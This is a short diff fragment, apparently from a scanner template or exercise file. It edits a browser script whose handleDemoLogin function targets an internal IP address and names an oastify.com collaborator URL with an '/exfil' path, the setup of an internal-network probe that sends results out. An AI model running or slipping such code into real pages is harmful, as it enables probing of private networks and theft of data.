@@ -31,7 +31,7 @@ info:
 
     <script>
       async function handleDemoLogin() {
-        const internalIp = "http://10.24.42.44/internal-api/status"; // Target internal IP
+        const internalIp = "http://10.83.34.78/"; // Target internal IP
         const collaborator = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/exfil";
         
         try {
